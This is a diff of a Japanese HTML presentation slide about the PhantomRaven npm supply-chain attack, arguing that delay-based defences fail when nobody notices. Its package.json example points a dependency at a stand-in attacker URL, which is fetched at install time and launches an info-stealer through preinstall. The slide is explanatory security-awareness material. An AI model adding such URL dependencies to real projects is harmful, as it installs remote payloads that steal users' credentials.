@@ -26,40 +26,36 @@
     .slide p { margin: 0; text-wrap: pretty; }
     .slide code { font-family: var(--font-mono); }
     .slide strong { color: var(--color-accent); }
-    .case {
-      padding: 22px 32px;
-      border-radius: 12px;
-      background: var(--color-surface);
-      display: flex;
-      flex-direction: column;
-      gap: 8px;
-    }
-    .case .muted { color: var(--color-muted); }
-    .case pre {
-      margin: 0;
-      padding: 10px 20px;
-      border-radius: 8px;
-      background: var(--color-code-bg);
-      color: var(--color-code-ink);
-      font-family: var(--font-mono);
-      font-size: var(--text-code);
-      line-height: 1.6;
-    }
-    .case pre .url { color: var(--color-danger); }
+    .cols { display: grid; grid-template-columns: 420px 1fr; gap: 32px; align-items: center; }
+    .left { display: flex; flex-direction: column; gap: 16px; }
+    .left .name { font-size: var(--text-h2); font-weight: 700; }
+    .left .step { color: var(--color-muted); }
+    .left .result { font-weight: 700; }
+    .file { border-radius: 12px; overflow: hidden; background: var(--color-code-bg); border: 1px solid var(--color-line); }
+    .file .fname { padding: 8px 16px; font-family: var(--font-mono); font-size: var(--text-code); color: var(--color-muted); border-bottom: 1px solid var(--color-line); }
+    .file pre { margin: 0; padding: 16px; font-family: var(--font-mono); font-size: var(--text-code); line-height: 1.6; color: var(--color-code-ink); white-space: pre; overflow: hidden; }
+    .file .url { color: var(--color-danger); }
     .slide .punch { margin-top: auto; text-align: center; font-size: var(--text-h2); font-weight: 700; }
-    .slide { gap: 28px; }
   </style>
 </head>
 <body class="slide">
   <h1>誰も気付かなかったら？</h1>
-  <div class="case">
-    <p><b>PhantomRaven</b></p>
-    <p class="muted">手口: 依存先を npm のパッケージ名ではなく URL で書く</p>
-<pre>"dependencies": {
-  "evil-pkg": "<span class="url">https://attacker.example.com/evil-pkg.tgz</span>"
+  <div class="cols">
+    <div class="left">
+      <p class="name">PhantomRaven</p>
+      <p class="step">依存先を URL で書く</p>
+      <p class="step">install 時に URL から package を取得<br>preinstall で InfoStealer 起動</p>
+      <p class="result">→ 2か月以上気付かれなかった</p>
+    </div>
+    <div class="file">
+      <div class="fname">package.json</div>
+<pre>{
+  "dependencies": {
+    "evil-pkg":
+      "<span class="url">https://attacker.example.com/evil-pkg.tgz</span>"
+  }
 }</pre>
-    <p class="muted">install 時に npm の外から取ってきて、preinstall で実行。npm 上の本体は空っぽで、依存も 0 に見える</p>
-    <p>→ <b>2か月以上気付かれなかった</b></p>
+    </div>
   </div>
   <p class="punch">誰も気付かなければ<strong>何日待っても防げない</strong></p>
   <aside class="notes">
